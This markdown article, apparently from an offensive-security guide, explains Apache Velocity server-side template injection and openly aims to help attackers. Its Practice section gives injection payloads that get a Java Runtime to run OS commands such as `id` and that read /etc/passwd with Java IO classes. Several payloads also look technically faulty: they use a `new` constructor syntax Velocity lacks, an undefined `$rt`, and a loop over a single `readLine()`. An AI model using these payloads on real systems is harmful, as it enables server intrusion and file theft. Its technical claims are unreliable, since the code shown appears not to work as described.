---
title: Mastering Velocity Exploitation Techniques
description: Explore Apache Velocity SSTI for remote code execution and file access
  with practical steps and payloads.
keywords:
- Velocity SSTI
- Apache Velocity
- remote code execution
- file access
- template injection
- Java runtime
- security vulnerabilities
- exploitation techniques
---

# Velocity Exploitation

## Context

This article provides a comprehensive guide to exploiting Apache Velocity template injection for offensive purposes. It is crafted to help offensive operators understand and execute attacks that culminate in command execution or sensitive file access through server-side template injection (SSTI). Before delving into these techniques, readers should have an understanding of template engines, the Java Runtime Environment, web server architecture, and generic SSTI techniques.

## Theory

### Apache Velocity Template Engine Internals

Apache Velocity is a Java-based templating engine that facilitates dynamic web content rendering. While it empowers developers with the capability to dynamically generate site content using the Velocity Template Language (VTL), it can also pose significant security risks if not properly sandboxed.

One underlying principle that makes Apache Velocity potentially dangerous is its ability to access Java objects and methods directly within the templates. If user input is embedded within these templates in an unsafe manner, it could be evaluated, leading to arbitrary code execution.

### Velocity Injection Attack Surface

The attack surface for Velocity injection is broadened by the ease with which Apache Velocity templates can evaluate user-controllable inputs. A typical attack sequence involves an adversary injecting Velocity syntax into any field or parameter processed by the template engine.

Developers often make the mistaken assumption that these templates are fully isolated from sensitive Java classes. In reality, Velocity templates can interact with a broad spectrum of Java classes, thanks to built-in objects such as `$runtime` and `$request`, thereby exposing sensitive interfaces and functionalities.

### Command Execution via Velocity SSTI

At the core of exploiting Velocity for command execution is the engine's linkage with the Java Runtime. It allows access to Java's underlying system processes if it isn't deliberately restricted, facilitating command execution directly through template evaluations.

Attackers exploit this by using syntax such as `#set($x=$rt.getRuntime())` to fetch a Runtime instance, which can then instigate command executions. Input filter mechanisms often fail against strategic input obfuscation or alternate syntax forms, thus allowing these injections to succeed.

### File Access and Inclusion via Velocity

For file access and inclusion, the Velocity engine utilizes Java's input/output (IO) classes, enabling attackers to read or include arbitrary files via template injections.

For example, malicious payloads can deliberately instantiate `File` or `FileInputStream` classes, achieving unauthorized file accesses and completions due to improper input validation and inadequate access controls in templates.

## Practice

### Velocity SSTI for Remote Command Execution

To exploit Velocity SSTI for Remote Command Execution:

1. Inject the following payload to obtain a Runtime instance and execute the `id` command on the server:
    
    ```velocity
    #set($x=$rt.getRuntime())
    #set($y=$x.exec('id'))
    $y.waitFor()
    ```

2. Read and display the command output by injecting additional Velocity syntax:
    
    ```velocity
    #set($is=$y.getInputStream())
    #set($br=new java.io.BufferedReader(new java.io.InputStreamReader($is)))
    #set($output='')
    #set($line = $br.readLine())
    #while($line)
    $output$line
    #set($line = $br.readLine())
    #end
    $output
    ```

*Outcome*: If successful, the attacker gains the ability to execute arbitrary OS commands on the target server, which can lead to significant control over the victim system.

### Velocity SSTI for Arbitrary File Read

To achieve Arbitrary File Read using Velocity SSTI:

1. Deploy the following payload to read contents of the `/etc/passwd` file using Java IO classes:

    ```velocity
    #set($fis=new java.io.FileInputStream('/etc/passwd'))
    #set($isr=new java.io.InputStreamReader($fis))
    #set($br=new java.io.BufferedReader($isr))
    #set($line='')
    #foreach($line in $br.readLine())$line
    #end
    ```

*Outcome*: This exploitation fetches and displays sensitive information like the contents of the `/etc/passwd` file, potentially exposing critical server data.

## Tools

- **Burp Suite**: A tool for intercepting traffic and testing security vulnerabilities.
- **curl**: A command-line utility for crafting HTTP requests.
- **VelocityPayloads**: Predefined payloads to facilitate SSTI exploitation in Apache Velocity.

This detailed guide should arm security practitioners with the operational knowledge to exploit Apache Velocity template injection vulnerabilities effectively and responsibly, following ethical hacking guidelines.
